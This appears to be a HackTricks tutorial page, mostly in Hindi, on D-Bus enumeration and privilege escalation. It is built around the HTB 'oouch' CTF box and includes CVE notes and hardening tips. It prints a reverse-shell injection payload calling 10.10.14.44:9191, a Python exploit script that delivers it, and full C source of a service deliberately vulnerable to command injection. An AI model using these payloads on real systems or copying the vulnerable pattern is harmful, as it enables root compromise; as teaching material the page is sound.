# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

Ubuntu desktop environments में D-Bus का उपयोग inter-process communications (IPC) mediator के रूप में किया जाता है। Ubuntu में एक साथ कई message buses चलती हैं: system bus, जिसका मुख्य उपयोग **privileged services द्वारा पूरे system से संबंधित services उपलब्ध कराने के लिए** किया जाता है, और हर logged-in user के लिए एक session bus, जो केवल उस विशेष user से संबंधित services उपलब्ध कराती है। यहाँ मुख्य रूप से system bus पर ध्यान दिया गया है, क्योंकि यह उच्च privileges (जैसे root) के साथ चलने वाली services से जुड़ी है और हमारा उद्देश्य privileges बढ़ाना है। ध्यान दें कि D-Bus architecture में हर session bus के लिए एक 'router' होता है। यह client द्वारा उस service के लिए बताए गए address के आधार पर client messages को उपयुक्त services तक पहुँचाता है, जिनसे वे communicate करना चाहते हैं।<sup>[[1]](#references)</sup>

D-Bus पर services को उनके द्वारा उपलब्ध कराए गए **objects** और **interfaces** से परिभाषित किया जाता है। Objects की तुलना standard OOP languages में class instances से की जा सकती है; हर instance की पहचान एक विशिष्ट **object path** से होती है। यह path, filesystem path की तरह, service द्वारा उपलब्ध कराए गए हर object की विशिष्ट पहचान करता है। शोध के लिए एक प्रमुख interface **org.freedesktop.DBus.Introspectable** है, जिसमें एक ही method, Introspect, होता है। यह method object के समर्थित methods, signals और properties का XML representation लौटाता है। यहाँ properties और signals को छोड़कर methods पर ध्यान दिया गया है।

D-Bus interface से communicate करने के लिए दो tools का उपयोग किया गया: **gdbus**, एक CLI tool जो scripts में D-Bus द्वारा उपलब्ध कराए गए methods को आसानी से invoke करता है, और [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), एक Python-आधारित GUI tool, जिसे हर bus पर उपलब्ध services enumerate करने और हर service में मौजूद objects दिखाने के लिए बनाया गया है।

```bash
sudo apt-get install d-feet
```

यदि आप **session bus** की जाँच कर रहे हैं, तो पहले मौजूदा address की पुष्टि करें:

```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

पहली image में D-Bus system bus के साथ registered services दिखाई गई हैं। System Bus button चुनने के बाद **org.debin.apt** को विशेष रूप से highlight किया गया है। D-Feet चुने हुए objects के interfaces, methods, properties और signals दिखाने के लिए इस service से query करता है, जैसा कि दूसरी image में दिखता है। हर method का signature भी दिया गया है।

एक उल्लेखनीय feature service का **process ID (pid)** और **command line** दिखाना है। इससे यह पुष्टि करने में मदद मिलती है कि service elevated privileges के साथ चल रही है या नहीं, जो research के लिए महत्वपूर्ण है।

**D-Feet method invocation की सुविधा भी देता है**: users parameters के रूप में Python expressions दर्ज कर सकते हैं, जिन्हें D-Feet service को भेजने से पहले D-Bus types में बदल देता है।

हालाँकि, ध्यान दें कि **कुछ methods को invoke करने से पहले authentication की आवश्यकता होती है**। हम इन methods को नज़रअंदाज़ करेंगे, क्योंकि हमारा लक्ष्य बिना credentials के अपने privileges बढ़ाना है।

यह भी ध्यान दें कि कुछ services, किसी user को कुछ actions करने की अनुमति होनी चाहिए या नहीं, यह पूछने के लिए org.freedeskto.PolicyKit1 नाम की दूसरी D-Bus service से query करती हैं।

## **कमांड लाइन Enumeration**

### Service Objects की सूची बनाएँ

खुले हुए D-Bus interfaces की सूची इस तरह बनाई जा सकती है:

```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```

**`(activatable)`** के रूप में चिह्नित services विशेष रूप से दिलचस्प हैं, क्योंकि वे **अभी चल नहीं रही हैं**, लेकिन bus request उन्हें मांग पर शुरू कर सकती है। `busctl list` पर ही न रुकें; उन नामों को उन वास्तविक binaries से जोड़ें जिन्हें वे चलाएँगी।

```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```

यह तुरंत बताता है कि activatable name के लिए कौन-सा `Exec=` path शुरू होगा और किस identity के तहत। अगर binary या उसकी execution chain की सुरक्षा कमजोर है, तो inactive service भी privilege-escalation का रास्ता बन सकती है।

एक privileged USB-imaging service के लिए, उसके system-bus name को image-writing action की **effective** policy से मिलाकर देखें। किसी पुराने vendor rule में administrative Unix group को बिना password prompt के `ResultActive=yes` दिया गया हो सकता है; पुष्टि करें कि मौजूदा account उस group का सदस्य है, session active है, rule वास्तव में loaded है और किसी अन्य rule से override नहीं हुआ है, और installed helper अब भी caller द्वारा चुने गए source और destination paths स्वीकार करता है। केवल service descriptor या पुराने package version से arbitrary file access साबित नहीं होता। Activation descriptor न होने से यह भी साबित नहीं होता कि service पहले से चल नहीं रही है। Image-writing method चलाए बिना fixed policy और service files की जाँच करें; [मूल service analysis](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) देखें।

#### Connections

[विकिपीडिया से:](https://en.wikipedia.org/wiki/D-Bus) जब कोई process bus से connection बनाता है, तो bus उस connection को एक खास bus name देता है, जिसे _unique connection name_ कहते हैं। इस प्रकार के bus names अपरिवर्तनीय होते हैं—यह सुनिश्चित है कि connection के मौजूद रहने तक वे नहीं बदलेंगे—और इससे भी अहम बात यह है कि bus के lifetime के दौरान उनका दोबारा उपयोग नहीं किया जा सकता। इसका मतलब है कि उस bus से कोई अन्य connection कभी भी वही unique connection name प्राप्त नहीं करेगा, भले ही वही process bus से connection बंद करके नया connection बनाए। Unique connection names को आसानी से पहचाना जा सकता है, क्योंकि वे colon character से शुरू होते हैं, जो अन्यथा निषिद्ध है।<sup>[[4]](#references)</sup>

### Service Object Info

इसके बाद, आप interface के बारे में कुछ जानकारी इस तरह प्राप्त कर सकते हैं:

```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
        cap_fowner cap_fsetid cap_kill cap_setgid
        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
        cap_mknod cap_lease cap_audit_write cap_audit_control
        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
        cap_wake_alarm cap_block_suspend cap_audit_read
```

बस नाम का उसकी `systemd` यूनिट और executable path से भी मिलान करें:

```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```

यह privesc के दौरान मायने रखने वाले operational सवाल का जवाब देता है: **अगर कोई method call सफल होता है, तो कार्रवाई कौन-सा वास्तविक binary और unit करेगा?**

### किसी Service Object के Interfaces की सूची बनाएँ

आपके पास पर्याप्त permissions होनी चाहिए।

```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
  └─/htb/oouch
    └─/htb/oouch/Block
```

### Service Object के Interface का Introspection

ध्यान दें कि इस उदाहरण में `tree` parameter का उपयोग करके खोजे गए सबसे नए interface को चुना गया था (_पिछला सेक्शन देखें_):

```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```

इंटरफ़ेस `htb.oouch.Block` के `.Block` method पर ध्यान दें (यही वह method है जिसमें हमारी रुचि है)। अन्य columns में मौजूद "s" का मतलब हो सकता है कि यह string की अपेक्षा कर रहा है।

कुछ भी खतरनाक करने से पहले, पहले किसी **read-oriented** या अन्यथा कम-जोखिम वाले method को validate करें। इससे तीन स्थितियों को साफ़ तौर पर अलग किया जा सकता है: गलत syntax, method तक पहुँचा जा सकता है लेकिन अनुमति नहीं है, या method तक पहुँचा जा सकता है और अनुमति है।

```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```

### D-Bus Methods को Policies और Actions से Correlate करें

Introspection आपको बताता है कि आप **क्या** call कर सकते हैं, लेकिन यह नहीं बताता कि call की अनुमति **क्यों** दी गई है या अस्वीकार की गई है। वास्तविक privesc triage के लिए आमतौर पर आपको **तीनों layers** को एक साथ inspect करना होता है:

1. **Activation metadata** (`.service` files या `SystemdService=`) से पता करें कि वास्तव में कौन-सा binary और unit चलेगा।
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) से पता करें कि कौन `own`, `send_destination`, या `receive_sender` कर सकता है।
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) से default authorization model (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`) पता करें।

उपयोगी commands:

```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```

Do **not** D-Bus method और Polkit action के बीच 1:1 mapping मानें। एक ही method, संशोधित किए जा रहे object या runtime context के आधार पर अलग action चुन सकता है। इसलिए व्यावहारिक workflow यह है:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` और संबंधित `.policy` files में grep करें
3. `busctl call`, `gdbus call`, या `dbusmap --enable-probes --null-agent` से कम जोखिम वाली live probes करें

Proxy या compatibility services पर विशेष ध्यान दें। कोई **root के रूप में चलने वाला proxy**, जो अपने पहले से स्थापित connection के ज़रिए अनुरोधों को दूसरी D-Bus service तक forward करता है, अनजाने में backend को हर अनुरोध UID 0 से आया हुआ मानने पर मजबूर कर सकता है—जब तक कि मूल caller की identity को दोबारा validate न किया जाए।<sup>[[3]](#references)</sup>

### Monitor/Capture Interface

पर्याप्त privileges के साथ (केवल `send_destination` और `receive_sender` privileges पर्याप्त नहीं हैं), आप **D-Bus communication को monitor** कर सकते हैं।

किसी **communication को monitor** करने के लिए आपको **root** होना होगा। यदि root होने के बाद भी समस्या आ रही है, तो [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) और [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) देखें।

> [!WARNING]
> यदि आपको पता है कि communication को **sniff करने के लिए non-root users को अनुमति** देने हेतु D-Bus config file कैसे configure करें, तो कृपया **मुझसे संपर्क करें**!

Monitor करने के अलग-अलग तरीके:

```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```

निम्नलिखित उदाहरण में `htb.oouch.Block` interface की निगरानी की जाती है और **संदेश "**_**lalalalal**_**" गलत संचार के कारण भेजा जाता है**:

```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
  UniqueName=:1.1376
  MESSAGE "s" {
          STRING "lalalalal";
  };

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
  Sender=:1.3  Destination=:1.1376
  UniqueName=:1.3
  MESSAGE "s" {
          STRING "Carried out :D";
  };
```

आप परिणामों को ऐसी **pcapng** फ़ाइल में सहेजने के लिए `monitor` की जगह `capture` का उपयोग कर सकते हैं, जिसे Wireshark खोल सकता है:

```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```

#### सारा शोर फ़िल्टर करना <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

अगर bus पर बहुत ज़्यादा जानकारी हो, तो इस तरह match rule पास करें:

```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```

कई नियम निर्दिष्ट किए जा सकते हैं। यदि कोई संदेश _किसी भी_ नियम से मेल खाता है, तो संदेश प्रिंट किया जाएगा। उदाहरण के लिए:

```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```

अधिक जानकारी के लिए [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) में match rule syntax देखें।<sup>[[7]](#references)</sup>

### अधिक

`busctl` में और भी विकल्प हैं, [**उन सभी को यहाँ देखें**](https://www.freedesktop.org/software/systemd/man/busctl.html)।

## **कमज़ोर परिदृश्य**

HTB के host "oouch" में **qtc user** के रूप में आपको _/etc/dbus-1/system.d/htb.oouch.Block.conf_ में स्थित एक **अप्रत्याशित D-Bus config file** मिल सकती है:

```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
 "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
 "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

    <policy user="root">
        <allow own="htb.oouch.Block"/>
    </policy>

	<policy user="www-data">
		<allow send_destination="htb.oouch.Block"/>
		<allow receive_sender="htb.oouch.Block"/>
	</policy>

</busconfig>
```

पिछले कॉन्फ़िगरेशन से ध्यान दें कि इस D-BUS communication के ज़रिए जानकारी भेजने और प्राप्त करने के लिए आपको `root` या `www-data` user होना होगा।

Docker container **aeb4525789d8** के अंदर **qtc** user के रूप में, आपको _/code/oouch/routes.py_ फ़ाइल में dbus से संबंधित code मिल सकता है। यह दिलचस्प code है:

```python
if primitive_xss.search(form.textfield.data):
        bus = dbus.SystemBus()
        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
        response = block_iface.Block(client_ip)
        bus.close()
        return render_template('hacker.html', title='Hacker')
```

जैसा कि आप देख सकते हैं, यह **D-Bus interface से कनेक्ट हो रहा है** और **"Block" function** को "client_ip" भेज रहा है।

D-Bus connection के दूसरे छोर पर एक C में compiled binary चल रही है। यह code D-Bus connection पर **IP address सुन रहा है और दिए गए IP address को block करने के लिए `system` function के ज़रिए iptables को call कर रहा है**।\
**`system` को जानबूझकर command injection के प्रति vulnerable बनाया गया है**, इसलिए नीचे दिए गए payload जैसा payload reverse shell बनाएगा: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

इस page के अंत में आपको **D-Bus application का पूरा C code** मिलेगा। इसमें lines 91-97 के बीच आप देख सकते हैं कि **`D-Bus object path` और `interface name`** कैसे **register** किए गए हैं। D-Bus connection को जानकारी भेजने के लिए यह जानकारी आवश्यक होगी:

```c
        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
```

साथ ही, line 57 में आप देख सकते हैं कि इस D-Bus communication के लिए **एकमात्र registered method** का नाम `Block` है (_**इसीलिए अगले section में payloads service object `htb.oouch.Block`, interface `/htb/oouch/Block` और method name `Block` को भेजे जाएंगे**_):

```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```

#### Python

निम्नलिखित python code, `block_iface.Block(runme)` के माध्यम से payload को D-Bus connection के `Block` method पर भेजेगा (_ध्यान दें कि इसे पिछले code chunk से निकाला गया था_):

```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```

#### busctl and dbus-send

```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```

- `dbus-send` एक टूल है जिसका उपयोग “Message Bus” को संदेश भेजने के लिए किया जाता है।
- Message Bus — एक सॉफ़्टवेयर है जिसका उपयोग सिस्टम ऐप्लिकेशनों के बीच आसानी से संचार कराने के लिए करते हैं। यह Message Queue से संबंधित है (जिसमें संदेश क्रम से व्यवस्थित होते हैं), लेकिन Message Bus में संदेश subscription model के ज़रिए भेजे जाते हैं और यह बहुत तेज़ भी होता है।
- “-system” टैग का उपयोग यह बताने के लिए किया जाता है कि यह system message है, session message नहीं (जो डिफ़ॉल्ट होता है)।
- “–print-reply” टैग का उपयोग हमारा संदेश सही ढंग से प्रिंट करने और मिले किसी भी जवाब को मानव-पठनीय रूप में दिखाने के लिए किया जाता है।
- “–dest=Dbus-Interface-Block” Dbus interface का पता है।
- “–string:” — interface को भेजे जाने वाले संदेश का प्रकार। संदेश भेजने के कई फ़ॉर्मैट हैं, जैसे double, bytes, booleans, int, objpath। इनमें से “object path” तब उपयोगी होता है जब हमें Dbus interface को किसी फ़ाइल का path भेजना हो। इस स्थिति में, हम फ़ाइल के नाम के रूप में interface को command पास करने के लिए एक special file (FIFO) का उपयोग कर सकते हैं। “string:;” — इसका उपयोग object path को फिर से call करने के लिए किया जाता है, जहाँ हम FIFO reverse shell फ़ाइल/command रखते हैं।

_ध्यान दें कि `htb.oouch.Block.Block` में, पहला भाग (`htb.oouch.Block`) service object को दर्शाता है और आख़िरी भाग (`.Block`) method name को दर्शाता है।_

### C कोड

```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
        char* host = NULL;
        int r;

        /* Read the parameters */
        r = sd_bus_message_read(m, "s", &host);
        if (r < 0) {
                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
                return r;
        }

        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

        int command_len = strlen(command);
        int host_len = strlen(host);

        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
        if(command_buffer == NULL) {
                fprintf(stderr, "Failed to allocate memory\n");
                return -1;
        }

        sprintf(command_buffer, command, host);

        /* In the first implementation, we simply ran command using system(), since the expected DBus
         * to be threading automatically. However, DBus does not thread and the application will hang
         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
         * multithreading)
         */
        int pid = fork();

        if ( pid == 0 ) {
            /* Here we are in the child process. We execute the command and eventually exit. */
            system(command_buffer);
            exit(0);
        } else {
            /* Here we are in the parent process or an error occured. We simply send a genric message.
             * In the first implementation we returned separate error messages for success or failure.
             * However, now we cannot wait for results of the system call. Therefore we simply return
             * a generic. */
            return sd_bus_reply_method_return(m, "s", "Carried out :D");
        }
        r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
        SD_BUS_VTABLE_START(0),
        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
        SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
        /*
         * Main method, registeres the htb.oouch.Block service on the system dbus.
         *
         * Paramaters:
         *      argc            (int)             Number of arguments, not required
         *      argv[]          (char**)          Argument array, not required
         *
         * Returns:
         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
         *      as long as the user keeps it alive.
         */


        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
        signal(SIGCHLD,SIG_IGN);

        sd_bus_slot *slot = NULL;
        sd_bus *bus = NULL;
        int r;

        /* First we need to connect to the system bus. */
        r = sd_bus_open_system(&bus);
        if (r < 0)
        {
                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
                goto finish;
        }

        /* Install the object */
        r = sd_bus_add_object_vtable(bus,
                                     &slot,
                                     "/htb/oouch/Block",  /* interface */
                                     "htb.oouch.Block",   /* service object */
                                     block_vtable,
                                     NULL);
        if (r < 0) {
                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
                goto finish;
        }

        /* Register the service name to find out object */
        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
        if (r < 0) {
                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
                goto finish;
        }

        /* Infinite loop to process the client requests */
        for (;;) {
                /* Process requests */
                r = sd_bus_process(bus, NULL);
                if (r < 0) {
                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
                        goto finish;
                }
                if (r > 0) /* we processed a request, try to process another one, right-away */
                        continue;

                /* Wait for the next request to process */
                r = sd_bus_wait(bus, (uint64_t) -1);
                if (r < 0) {
                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
                        goto finish;
                }
        }

finish:
        sd_bus_slot_unref(slot);
        sd_bus_unref(bus);

        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```

## Automated Enumeration Helpers (2023-2025)

`busctl`/`gdbus` के साथ बड़े D-Bus attack surface की manually enumeration करना जल्दी ही कष्टदायक हो जाता है। पिछले कुछ वर्षों में जारी की गई दो छोटी FOSS utilities, red-team या CTF engagements के दौरान काम तेज़ कर सकती हैं:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* C में लिखा गया; एक single static binary (<50 kB), जो हर object path को scan करता है, `Introspect` XML प्राप्त करता है और उसे owning PID/UID से map करता है।<sup>[[5]](#references)</sup>
* उपयोगी flags:
  ```bash
  # List every service on the *system* bus and dump all callable methods
  sudo dbus-map --dump-methods

  # Actively probe methods/properties you can reach without Polkit prompts
  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
  ```
* यह टूल असुरक्षित well-known names को `!` से चिह्नित करता है, जिससे तुरंत पता चलता है कि किन services को आप *own* (take over) कर सकते हैं या किन method calls तक unprivileged shell से पहुंचा जा सकता है।

### uptux.py
* लेखक: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* केवल Python में लिखी गई script, जो systemd units में *writable* paths **और** अत्यधिक permissive D-Bus policy files (जैसे `send_destination="*"`) खोजती है।<sup>[[6]](#references)</sup>
* त्वरित उपयोग:
  ```bash
  python3 uptux.py -n          # run all checks but don’t write a log file
  python3 uptux.py -d          # enable verbose debug output
  ```
* D-Bus module नीचे दी गई directories में खोजता है और ऐसी services को दिखाता है जिन्हें सामान्य user spoof या hijack कर सकता है:
  * `/etc/dbus-1/system.d/` और `/usr/share/dbus-1/system.d/`
  * `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## उल्लेखनीय D-Bus Privilege-Escalation Bugs (2024-2025)

हाल ही में प्रकाशित CVEs पर नज़र रखने से custom code में ऐसे ही असुरक्षित patterns पहचानने में मदद मिलती है। हाल के दो अच्छे उदाहरण हैं:<sup>[[2]](#references)[[3]](#references)</sup>

| वर्ष | CVE | Component | मूल कारण | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root के रूप में चलने वाली service ने ऐसा D-Bus interface दिया था जिसे unprivileged users reconfigure कर सकते थे, जिसमें attacker-controlled macro behavior लोड करना भी शामिल था। | अगर कोई daemon system bus पर **device/profile/config management** उपलब्ध कराता है, तो writable configuration और macro features को सिर्फ़ "settings" नहीं, बल्कि code-execution primitives मानें। |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root के रूप में चलने वाले compatibility proxy ने requests को backend services तक भेजते समय मूल caller का security context बनाए नहीं रखा, इसलिए backends ने proxy पर UID 0 के रूप में भरोसा किया। | **proxy / bridge / compatibility** D-Bus services को एक अलग bug class मानें: अगर वे privileged calls relay करती हैं, तो जाँचें कि caller का UID/Polkit context backend तक कैसे पहुँचता है। |

ध्यान देने योग्य patterns:
1. Service **system bus पर root के रूप में चलती है**।
2. या तो **authorization check नहीं होता**, या check **गलत subject** के आधार पर किया जाता है।
3. संबंधित method अंततः system state बदलता है: package install, user/group में बदलाव, bootloader config, device profile updates, file writes या सीधे command execution।

यह पुष्टि करने के लिए कि किसी method तक पहुँचा जा सकता है या नहीं, `dbusmap --enable-probes` या manual `busctl call` का इस्तेमाल करें। फिर service की policy XML और Polkit actions जाँचें, ताकि पता चले कि वास्तव में **किस subject** को authorize किया जा रहा है।

---

## Hardening और Detection के त्वरित उपाय

* world-writable या *send/receive*-open policies खोजें:
  ```bash
  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
  ```
* खतरनाक methods के लिए Polkit अनिवार्य करें – *root* proxies को भी अपना PID देने के बजाय *caller* का PID `polkit_authority_check_authorization_sync()` को देना चाहिए।
* लंबे समय तक चलने वाले helpers में privileges छोड़ें (bus से कनेक्ट होने के बाद namespaces स्विच करने के लिए `sd_pid_get_owner_uid()` का उपयोग करें)।
* यदि आप किसी service को हटा नहीं सकते, तो कम-से-कम उसे एक समर्पित Unix group तक *सीमित* करें और उसकी XML policy में access प्रतिबंधित करें।
* Blue-team: `busctl capture > /var/log/dbus_$(date +%F).pcapng` का उपयोग करके system bus capture करें और anomaly detection के लिए उसे Wireshark में import करें।

---

## References

- [1] [Ubuntu Desktop में USBCreator D-Bus Privilege Escalation](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
